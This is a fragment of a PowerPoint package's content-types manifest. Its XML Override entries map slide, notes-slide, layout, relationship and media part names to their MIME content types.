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07.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.notesSlide+xml"/>
  <Override PartName="/ppt/notesSlides/notesSlide88.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.notesSlide+xml"/>
  <Override PartName="/ppt/notesSlides/notesSlide100.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.notesSlide+xml"/>
  <Override PartName="/ppt/notesSlides/notesSlide137.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.notesSlide+xml"/>
  <Override PartName="/ppt/notesSlides/notesSlide99.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.notesSlide+xml"/>
  <Override PartName="/ppt/notesSlides/notesSlide97.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.notesSlide+xml"/>
  <Override PartName="/ppt/notesSlides/notesSlide48.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.notesSlide+xml"/>
  <Override PartName="/ppt/notesSlides/notesSlide60.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.notesSlide+xml"/>
  <Override PartName="/ppt/notesSlides/notesSlide116.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.notesSlide+xml"/>
  <Override PartName="/ppt/notesSlides/notesSlide91.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.notesSlide+xml"/>
  <Override PartName="/ppt/notesSlides/notesSlide94.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.notesSlide+xml"/>
  <Override PartName="/ppt/notesSlides/_rels/notesSlide108.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/notesSlides/_rels/notesSlide115.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/notesSlides/_rels/notesSlide100.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/notesSlides/_rels/notesSlide103.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/notesSlides/_rels/notesSlide91.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/notesSlides/_rels/notesSlide97.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/notesSlides/_rels/notesSlide83.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/notesSlides/_rels/notesSlide89.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/notesSlides/_rels/notesSlide102.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/notesSlides/_rels/notesSlide101.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/notesSlides/_rels/notesSlide116.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/notesSlides/_rels/notesSlide135.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/notesSlides/_rels/notesSlide120.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80.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/notesSlides/_rels/notesSlide95.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/notesSlides/_rels/notesSlide79.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/notesSlides/_rels/notesSlide14.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/notesSlides/_rels/notesSlide51.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/notesSlides/_rels/notesSlide98.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/notesSlides/_rels/notesSlide60.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/notesSlides/_rels/notesSlide137.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/notesSlides/_rels/notesSlide88.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/notesSlides/_rels/notesSlide107.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/notesSlides/_rels/notesSlide129.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/notesSlides/_rels/notesSlide114.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/notesSlides/_rels/notesSlide94.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/notesSlides/_rels/notesSlide130.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/notesSlides/_rels/notesSlide47.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/notesSlides/_rels/notesSlide121.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/notesSlides/_rels/notesSlide134.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/notesSlides/_rels/notesSlide37.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/notesSlides/_rels/notesSlide15.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/notesSlides/_rels/notesSlide99.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/notesSlides/_rels/notesSlide84.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/notesSlides/_rels/notesSlide46.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/notesSlides/_rels/notesSlide87.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/notesSlides/_rels/notesSlide48.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/notesSlides/_rels/notesSlide33.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/notesSlides/notesSlide51.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.notesSlide+xml"/>
  <Override PartName="/ppt/notesSlides/notesSlide14.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9.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.notesSlide+xml"/>
  <Override PartName="/ppt/notesSlides/notesSlide108.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37.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.notesSlide+xml"/>
  <Override PartName="/ppt/notesSlides/notesSlide98.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25.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.notesSlide+xml"/>
  <Override PartName="/ppt/notesSlides/notesSlide15.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.notesSlide+xml"/>
  <Override PartName="/ppt/notesSlides/notesSlide114.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.notesSlide+xml"/>
  <Override PartName="/ppt/notesSlides/notesSlide95.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.notesSlide+xml"/>
  <Override PartName="/ppt/notesSlides/notesSlide46.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.notesSlide+xml"/>
  <Override PartName="/ppt/notesSlides/notesSlide84.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.notesSlide+xml"/>
  <Override PartName="/ppt/notesSlides/notesSlide103.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.notesSlide+xml"/>
  <Override PartName="/ppt/notesSlides/notesSlide115.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.notesSlide+xml"/>
  <Override PartName="/ppt/notesSlides/notesSlide47.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.notesSlide+xml"/>
  <Override PartName="/ppt/notesSlides/notesSlide10.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.notesSlide+xml"/>
  <Override PartName="/ppt/notesSlides/notesSlide33.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83.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.notesSlide+xml"/>
  <Override PartName="/ppt/notesSlides/notesSlide87.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.notesSlide+xml"/>
  <Override PartName="/ppt/_rels/presentation.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35.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47.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slideLayouts/_rels/slideLayout63.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41.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slideLayouts/_rels/slideLayout50.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slideLayouts/_rels/slideLayout4.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53.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slideLayouts/_rels/slideLayout62.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slideLayouts/_rels/slideLayout46.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slideLayouts/_rels/slideLayout52.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slideLayouts/_rels/slideLayout76.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slideLayouts/_rels/slideLayout38.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6.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slideLayouts/_rels/slideLayout81.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slideLayouts/_rels/slideLayout65.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slideLayouts/_rels/slideLayout74.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slideLayouts/_rels/slideLayout58.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slideLayouts/_rels/slideLayout82.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75.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slideLayouts/_rels/slideLayout80.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slideLayouts/_rels/slideLayout64.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78.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5.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slideLayouts/_rels/slideLayout59.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28.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slideLayout+xml"/>
  <Override PartName="/ppt/slideLayouts/slideLayout70.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slideLayout+xml"/>
  <Override PartName="/ppt/slideLayouts/slideLayout65.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slideLayout+xml"/>
  <Override PartName="/ppt/slideLayouts/slideLayout29.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slideLayout+xml"/>
  <Override PartName="/ppt/slideLayouts/slideLayout71.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slideLayout+xml"/>
  <Override PartName="/ppt/slideLayouts/slideLayout66.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79.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media/image56.png" ContentType="image/png"/>
  <Override PartName="/ppt/media/image40.jpeg" ContentType="image/jpeg"/>
  <Override PartName="/ppt/media/image53.png" ContentType="image/png"/>
  <Override PartName="/ppt/media/image29.png" ContentType="image/png"/>
  <Override PartName="/ppt/media/image52.png" ContentType="image/png"/>
  <Override PartName="/ppt/media/image27.jpeg" ContentType="image/jpeg"/>
  <Override PartName="/ppt/media/image10.png" ContentType="image/png"/>
  <Override PartName="/ppt/media/image47.png" ContentType="image/png"/>
  <Override PartName="/ppt/media/image35.png" ContentType="image/png"/>
  <Override PartName="/ppt/media/image5.png" ContentType="image/png"/>
  <Override PartName="/ppt/media/image17.png" ContentType="image/png"/>
  <Override PartName="/ppt/media/image28.png" ContentType="image/png"/>
  <Override PartName="/ppt/media/image34.png" ContentType="image/png"/>
  <Override PartName="/ppt/media/image4.png" ContentType="image/png"/>
  <Override PartName="/ppt/media/image31.wmf" ContentType="image/x-wmf"/>
  <Override PartName="/ppt/media/image61.jpeg" ContentType="image/jpeg"/>
  <Override PartName="/ppt/media/image3.png" ContentType="image/png"/>
  <Override PartName="/ppt/media/image26.png" ContentType="image/png"/>
  <Override PartName="/ppt/media/image48.png" ContentType="image/png"/>
  <Override PartName="/ppt/media/image11.png" ContentType="image/png"/>
  <Override PartName="/ppt/media/image60.png" ContentType="image/png"/>
  <Override PartName="/ppt/media/image12.png" ContentType="image/png"/>
  <Override PartName="/ppt/media/image24.png" ContentType="image/png"/>
  <Override PartName="/ppt/media/image21.png" ContentType="image/png"/>
  <Override PartName="/ppt/media/image22.png" ContentType="image/png"/>
  <Override PartName="/ppt/media/image57.png" ContentType="image/png"/>
  <Override PartName="/ppt/media/image20.png" ContentType="image/png"/>
  <Override PartName="/ppt/media/image32.png" ContentType="image/png"/>
  <Override PartName="/ppt/media/image2.png" ContentType="image/png"/>
  <Override PartName="/ppt/media/image14.png" ContentType="image/png"/>
  <Override PartName="/ppt/media/image62.png" ContentType="image/png"/>
  <Override PartName="/ppt/media/image25.png" ContentType="image/png"/>
  <Override PartName="/ppt/media/image18.png" ContentType="image/png"/>
  <Override PartName="/ppt/media/image6.png" ContentType="image/png"/>
  <Override PartName="/ppt/media/image9.jpeg" ContentType="image/jpeg"/>
  <Override PartName="/ppt/media/image36.png" ContentType="image/png"/>
  <Override PartName="/ppt/media/image58.png" ContentType="image/png"/>
  <Override PartName="/ppt/media/image15.wmf" ContentType="image/x-wmf"/>
  <Override PartName="/ppt/media/image54.png" ContentType="image/png"/>
  <Override PartName="/ppt/media/image19.png" ContentType="image/png"/>
  <Override PartName="/ppt/media/image7.png" ContentType="image/png"/>
  <Override PartName="/ppt/media/image37.png" ContentType="image/png"/>
  <Override PartName="/ppt/media/image59.png" ContentType="image/png"/>
  <Override PartName="/ppt/media/image16.wmf" ContentType="image/x-wmf"/>
  <Override PartName="/ppt/media/image55.png" ContentType="image/png"/>
  <Override PartName="/ppt/media/image23.jpeg" ContentType="image/jpeg"/>
  <Override PartName="/ppt/media/image8.png" ContentType="image/png"/>
  <Override PartName="/ppt/media/image38.png" ContentType="image/png"/>
  <Override PartName="/ppt/media/image1.png" ContentType="image/png"/>
  <Override PartName="/ppt/media/image13.png" ContentType="image/png"/>
  <Override PartName="/ppt/media/image30.png" ContentType="image/png"/>
  <Override PartName="/ppt/media/image33.wmf" ContentType="image/x-wmf"/>
  <Override PartName="/ppt/media/image39.png" ContentType="image/png"/>
  <Override PartName="/ppt/media/image44.png" ContentType="image/png"/>
  <Override PartName="/ppt/media/image41.png" ContentType="image/png"/>
  <Override PartName="/ppt/media/image42.png" ContentType="image/png"/>
  <Override PartName="/ppt/media/image43.png" ContentType="image/png"/>
  <Override PartName="/ppt/media/image45.png" ContentType="image/png"/>
  <Override PartName="/ppt/media/image46.png" ContentType="image/png"/>
  <Override PartName="/ppt/media/image49.wmf" ContentType="image/x-wmf"/>
  <Override PartName="/ppt/media/image51.png" ContentType="image/png"/>
  <Override PartName="/ppt/media/image50.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06.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide73.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide150.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide76.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide109.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide103.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide26.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide70.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide105.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide72.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide75.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide108.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide152.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide107.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide74.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide151.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide104.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide71.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide102.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide25.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide101.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide24.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide94.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide127.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide69.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide53.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146.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide137.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide131.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide149.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide143.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide139.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide54.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide142.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide138.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide77.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide133.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide147.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide7.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide42.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide132.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide52.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide40.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide145.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide55.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide29.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide87.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide3.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide97.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide44.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12.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide89.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide14.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide98.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide45.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide19.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide100.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide23.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide13.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide99.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide50.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide32.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide1.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide51.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide33.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide110.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide129.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide96.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide43.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide85.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide118.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide88.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide128.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide95.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7.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide113.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide80.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81.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide114.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide37.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide144.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide130.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide5.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide135.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide30.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide79.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide111.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide34.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4.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide134.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide78.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide31.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide117.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide84.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide120.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide83.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide116.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide3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136.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide2.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide119.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide86.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115.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide38.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide82.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide112.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide35.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide148.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58.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide15.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23.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide46.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide90.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide124.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide47.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide91.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide62.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide140.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide63.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide141.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121.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide66.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide122.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide67.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide125.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide48.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide92.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide68.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide126.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide93.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/ppt/slides/_rels/slide49.xml.rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
